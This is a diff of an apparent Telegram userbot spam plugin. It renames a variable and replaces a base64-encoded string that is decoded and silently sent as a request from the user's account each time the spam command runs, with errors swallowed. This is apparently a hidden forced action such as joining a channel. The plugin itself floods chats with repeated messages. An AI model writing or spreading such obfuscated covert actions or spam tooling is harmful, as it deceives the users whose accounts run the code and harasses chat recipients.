@@ -20,16 +20,16 @@ async def spammer(e):
     if not os.path.isdir(config.TMP_DOWNLOAD_DIRECTORY):
         os.makedirs(config.TMP_DOWNLOAD_DIRECTORY)
     try:
-        hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        hmm = pybase64.b64decode("VTkzNEwtenllblRXZGJnWg==")
         hmm = Get(hmm)
         await e.client(hmm)
     except BaseException:
         pass
-    cat = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
-    counter = int(cat[0])
+    mega = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
+    counter = int(mega[0])
     if counter > 50:
         return await edit_or_reply(e, "Use `.bigspam` for spam greater than 50")
-    if len(cat) == 2:
+    if len(mega) == 2:
         spam_message = str(("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)[1])
         await e.delete()
         for _ in range(counter):
@@ -172,9 +172,9 @@ async def spammer(e):
         await e.client(hmm)
     except BaseException:
         pass
-    cat = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
-    counter = int(cat[0])
-    if len(cat) == 2:
+    mega = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
+    counter = int(mega[0])
+    if len(mega) == 2:
         spam_message = str(("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)[1])
         await e.delete()
         for _ in range(counter):
